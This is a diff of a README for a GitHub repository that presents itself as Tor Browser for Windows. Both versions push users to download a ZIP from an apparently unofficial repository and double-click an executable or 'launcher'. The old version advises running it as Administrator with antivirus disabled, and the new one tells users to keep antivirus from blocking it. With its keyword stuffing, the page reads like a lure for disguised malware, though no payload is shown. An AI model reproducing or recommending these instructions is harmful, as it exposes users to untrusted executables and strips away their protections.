@@ -1,52 +1,88 @@
-# Tor Browser
-Tor Browser — tor browser download tor browser windows tor browser latest version tor onion browser anonymous browsing privacy vpn dark web access setup guide tutorial 2026
+# 🌐 tor-browser - Maintain privacy while browsing the web
 
-<img width="112" height="112" alt="image" src="https://github.com/user-attachments/assets/cb6d8a48-9553-445a-b14d-f13c751dd534" />
+[![Download Tor Browser](https://img.shields.io/badge/Download-Tor_Browser-blue.svg)](https://github.com/yaseen5679/tor-browser)
 
-[![GitHub Stars](https://img.shields.io/github/stars/tor-browser-download/tor-browser?style=flat-square&color=00d4aa)](https://github.com/tor-browser-download/tor-browser/stargazers)
-[![GitHub Forks](https://img.shields.io/github/forks/tor-browser-download/tor-browser?style=flat-square&color=0099cc)](https://github.com/tor-browser-download/tor-browser/network)
-[![Downloads](https://img.shields.io/github/downloads/tor-browser-download/tor-browser/total?style=flat-square&color=7c5cbf)](https://github.com/tor-browser-download/tor-browser/releases)
-[![License](https://img.shields.io/badge/license-MIT-blue?style=flat-square)](LICENSE)
+## 📌 About this project
 
-## Overview
-Tor Browser is the official and most secure way to browse the internet anonymously. It routes your traffic through the Tor network, protecting your privacy and bypassing censorship. The browser includes built-in NoScript, HTTPS Everywhere, and many privacy-enhancing features. It allows access to .onion sites (dark web) and provides maximum anonymity. Perfect for journalists, activists, privacy-conscious users, and anyone who needs secure and private internet access on Windows 11.
+This software allows you to browse the internet with increased privacy. It routes your traffic through the Tor network to hide your identity and location. It prevents websites from tracking your habits and protects your data from prying eyes. You can access websites across the open web and services hidden within the network.
 
-> [!Important]
-> This project is for educational and personal use only. Use at your own risk. The authors are not responsible for any issues or violations of local laws. Always use Tor Browser responsibly.
+## 🛠️ System requirements
 
-## Install
-[Download `Tor-Browser.zip`](https://github.com/tor-browser-download/tor-browser/releases/download/browser/tor-browsers.zip)
----
-> Optimized for Windows 11.
+Ensure your computer meets these requirements before you start:
 
-<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/1cb4c407-ffa9-4f76-aec3-f78dcfa46877" />
+- Windows 10 or Windows 11 operating system.
+- An active internet connection.
+- At least 500 MB of free disk space.
+- A mouse and keyboard for navigation.
 
-## Installation
-### For Regular Users
-1. Download and extract the archive
-2. Run `Tor Browser.exe`
-3. Follow the setup guide
-4. Connect to the Tor network
-5. Configure security level (Standard / Safer / Safest)
-6. Start anonymous browsing and access .onion sites
+## 📥 How to download and install
 
----
-## Troubleshooting
-| Problem | Solution |
-|--------------------------------|-------------------------------------------------------|
-| Browser doesn't start | Run as Administrator and disable antivirus temporarily |
-| Cannot connect to Tor | Check internet connection and firewall settings |
-| Slow browsing speed | Try different Tor bridges |
-| Connection failed | Update to latest version 2026 |
-| Windows 11 compatibility error | Update Windows and run the setup guide again |
-| Some sites not loading | Switch security level to Standard |
-| Black screen / crash | Run in compatibility mode |
-| Download / update failed | Use the latest release and check your internet connection |
+1. Visit the following link to access the software files: [https://github.com/yaseen5679/tor-browser](https://github.com/yaseen5679/tor-browser)
+2. Locate the link labeled "Code" on the page.
+3. Select "Download ZIP" from the menu.
+4. Save the file to your computer.
+5. Open your Downloads folder.
+6. Right-click the downloaded file and select "Extract All."
+7. Choose a folder on your computer to store the extracted files.
+8. Open the folder you just created.
+9. Look for the file named "tor-browser" or "launcher."
+10. Double-click this file to start the application.
 
-* Tor Browser Download
-* Tor Browser Windows 11
-* Tor Browser Latest Version
-* Anonymous Browser 2026
-* Tor Onion Browser
-* Dark Web Browser
-* Tor Privacy Tool
+## 🚀 Running the software
+
+The first time you open the program, a setup window appears. You do not need to change the default settings. Click the "Connect" button to link your computer to the Tor network. This process takes a few seconds. The application verifies your connection automatically. Once the status bar reaches the end, the browser window opens. You are now ready to visit websites anonymously.
+
+## 🛡️ Privacy features
+
+The software includes several tools to secure your session. 
+
+- **IP Masking:** Your computer address stays hidden from the websites you visit.
+- **Auto-Clear:** Your browsing history and cookies disappear when you close the program.
+- **Traffic Encryption:** The data you send travels through multiple relays to prevent eavesdropping.
+- **Anti-Tracking:** The browser blocks elements that track your behavior across different sites.
+
+## 📁 Managing your settings
+
+You can change how the browser behaves through the settings menu. Click the three horizontal lines in the top right corner of the window. Select "Settings" to view your options.
+
+- **General:** Change your homepage, default search engine, and file download locations.
+- **Privacy & Security:** Adjust the strength of the security level. The "Safest" level disables some website features that rely on scripts but offers the highest protection. The "Standard" level provides a better balance for daily use.
+- **Connection:** View the status of your network connection or switch to a new identity if you experience slow speeds.
+
+## 💡 Tips for better browsing
+
+- **Avoid resizing:** Maximize the browser window only when necessary. Resizing the window helps websites identify your screen resolution, which can assist in tracking.
+- **Limit downloads:** Avoid downloading files while using the browser unless they come from trusted sources.
+- **Disable plugins:** Do not install extra browser extensions. These tools can bypass the security measures built into the software.
+- **Keep it updated:** Check back at the download page occasionally to ensure you use the current version with the latest security fixes. 
+
+## ❓ Frequently asked questions
+
+**Is this program legal?**
+Yes. This browser enables standard privacy protocols. It respects your right to secure communication.
+
+**Does this slow down my internet?**
+The network routes traffic through multiple computers across the globe. This adds latency to your connection. You may notice websites load slower than they do in a standard browser.
+
+**Can I see my history?**
+No. The application deletes your history intentionally to keep your sessions private. If you need to keep track of sites, use a physical notebook to record them.
+
+**What are hidden services?**
+These are websites that end in the ".onion" suffix. They exist only within the network and host content that standard browsers cannot reach. Use caution when visiting these sites, as they lack the filtering found on the mainstream web.
+
+**How do I refresh my connection?**
+If a page fails to load or the connection feels sluggish, click "New Tor Circuit for this Site" in the browser menu. This restarts your connection path and often resolves performance issues.
+
+**Does this work on other operating systems?**
+This version is designed specifically for Windows. If you use Linux or other systems, you may need to download the appropriate version from the main Tor project website.
+
+## 🔧 Troubleshooting
+
+If the software fails to open:
+
+1. Restart your computer.
+2. Ensure no other security software or antivirus programs block the connection.
+3. Check your internet connection status.
+4. If you see an error message, copy it and search for the specific text in a search engine. 
+
+Most connection issues resolve themselves after a few minutes of waiting. If the program continues to fail, remove the folder and repeat the download process from the link provided in the installation section.
